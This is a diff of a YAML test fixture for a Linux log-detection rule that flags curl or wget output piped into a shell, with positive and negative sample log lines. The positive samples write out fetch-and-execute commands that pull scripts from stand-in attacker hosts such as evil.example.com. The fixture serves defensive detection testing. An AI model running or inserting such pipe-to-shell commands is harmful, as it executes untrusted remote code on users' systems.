@@ -1,22 +1,33 @@
 rule: lnx-exec-001
 
-# Needs curl/wget AND a pipe-to-shell pattern.
-
 positive:
-  - description: curl piped to sh
+  - description: drive-by curl piped to sh
     event:
-      full_log: 'user ran: curl http://evil.local/installer.sh | sh'
+      ident: bash
+      full_log: 'invoked: curl -fsSL https://evil.example.com/payload.sh | sh by uid=0'
   - description: wget piped to bash
     event:
-      full_log: 'wget -qO- http://evil.local/init.sh | bash'
-  - description: wget -O- piped via /bin/sh
+      ident: bash
+      full_log: 'invoked: wget -qO- https://evil.example.com/x.sh | bash by uid=1000'
+  - description: curl piped to /bin/sh explicitly
     event:
-      full_log: 'wget -O- http://x/y | /bin/sh'
+      ident: audit
+      full_log: 'type=EXECVE msg=audit: bash -c " curl -s https://evil/x | /bin/sh"'
 
 negative:
-  - description: curl saved to disk only
+  - description: routine curl with no pipe to shell
     event:
-      full_log: 'curl -o /tmp/installer.sh http://example.local/x.sh'
-  - description: Plain bash command
+      ident: bash
+      full_log: 'invoked: curl -fsSL https://api.example.com/health > /tmp/health.json'
+  - description: routine wget download to a file
     event:
-      full_log: 'user ran: bash /usr/local/bin/legit.sh'
+      ident: bash
+      full_log: 'invoked: wget -O /tmp/release.tar.gz https://releases.example.com/v1.tar.gz'
+  - description: a log quoting "| sh" inside a tutorial, no curl/wget
+    event:
+      ident: docs
+      full_log: 'help reference: ls /etc | sh -c "wc -l" lists files into wc'
+  - description: pipe to shell from a build tool, no remote download
+    event:
+      ident: make
+      full_log: 'make: cat /tmp/script.sh | sh runs the local generator'
